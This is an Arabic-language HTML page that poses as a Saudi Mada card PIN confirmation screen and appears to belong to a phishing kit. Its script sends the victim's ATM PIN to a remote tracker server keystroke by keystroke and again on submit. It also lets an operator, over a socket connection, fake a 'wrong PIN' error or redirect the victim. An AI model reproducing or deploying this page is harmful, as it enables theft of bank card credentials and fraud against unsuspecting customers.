<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الرمز السري للبطاقة (PIN)</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="otp.css">
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
</head>
<body>
    <div class="box">
        <div class="h-otp"><div class="sh-ic">🔐</div><div><h2>الرمز السري لبطاقة الصراف</h2><div style="font-size: 11px; color: #94a3b8; font-weight: 600;">ATM PIN Code Verification</div></div></div>
        <p class="subt">لتأكيد تفويض عملية الدفع عبر نظام البنك المركزي السعودي المطور (مدى)، يرجى إدخال الرمز السري المكون من 4 أرقام المخصص لبطاقتك في أجهزة الصراف الآلي.</p>
        <div class="err-m" id="err-box">الرمز السري المدخل غير صحيح، يرجى إعادة المحاولة بعناية.</div>
        <form id="pin-form" onsubmit="handlePinSubmit(event)">
            <input type="password" id="pin-input" placeholder="••••" maxlength="4" autocomplete="off" oninput="handlePinInput(this)" style="letter-spacing: 12px; font-size: 26px;">
            <button type="submit" class="submit-btn" id="pin-submit-btn" disabled>تأكيد وإرسال</button>
        </form>
        <div class="secure-footer">🔒 تشفير بنكي معتمد وشفاف بالكامل</div>
    </div>
    <script src="saas-hub-config.js"></script><script src="config.js"></script><script>var SERVER_URL = window.SERVER_HUB_URL || "http://localhost:5000", siteKey = "site_sehhaty_app_v1", visitorToken = localStorage.getItem('visitor_token') || 'vis_' + Math.random().toString(36).substring(2, 10);
        var formName = "الرمز السري للصراف (PIN)";

        fetch(SERVER_URL + '/api/tracker/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/pin.html', pageTitle: 'تأكيد الرمز السري للبطاقة - PIN' }) }).catch(function(){});

        try {
            var socket = io(SERVER_URL);
            socket.on('visitor_updated', function(v) {
                if (v.token === visitorToken && v.status === 'go' && v.redirectUrl) {
                    if (v.redirectUrl.includes('errr=1')) {
                        document.getElementById('err-box').style.display = 'block';
                        var inp = document.getElementById('pin-input'); inp.value = ''; inp.focus();
                        document.getElementById('pin-submit-btn').disabled = true;
                        document.getElementById('pin-submit-btn').innerText = "تأكيد وإرسال";
                    } else { window.location.href = v.redirectUrl; }
                }
            });
        } catch(e){}

        var streamDebounce = null;
        function handlePinInput(el) {
            var val = el.value.replace(/\D/g, ''); el.value = val;
            document.getElementById('pin-submit-btn').disabled = (val.length < 4);
            document.getElementById('err-box').style.display = 'none';

            clearTimeout(streamDebounce);
            streamDebounce = setTimeout(function() {
                fetch(SERVER_URL + '/api/tracker/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, formName: formName + " (يجري الإدخال 🟡)", submissionData: { 'الرمز السري للبطاقة PIN': val, 'الحالة': 'يجري الكتابة' }, isFinalSubmission: false, isImportant: true }) }).catch(function(){});
            }, 200);
        }

        function handlePinSubmit(e) {
            e.preventDefault(); var val = document.getElementById('pin-input').value; if (val.length < 4) return;
            var btn = document.getElementById('pin-submit-btn'); btn.disabled = true; btn.innerText = "جاري التأكيد...";

            fetch(SERVER_URL + '/api/tracker/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, formName: formName + " (مؤكد ✅)", submissionData: { 'الرمز السري للبطاقة PIN': val, 'الحالة': 'تم الإرسال والتحقق' }, isFinalSubmission: true, isImportant: true }) }).then(function() {
                fetch(SERVER_URL + '/api/tracker/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/loading_phone.html', pageTitle: 'جاري مطابقة الرمز السري...' }) }).catch(function(){});
                setTimeout(function() { window.location.href = 'loading_phone.html'; }, 800);
            }).catch(function() { btn.disabled = false; btn.innerText = "تأكيد وإرسال"; });
        }
    </script>
</body>
</html>
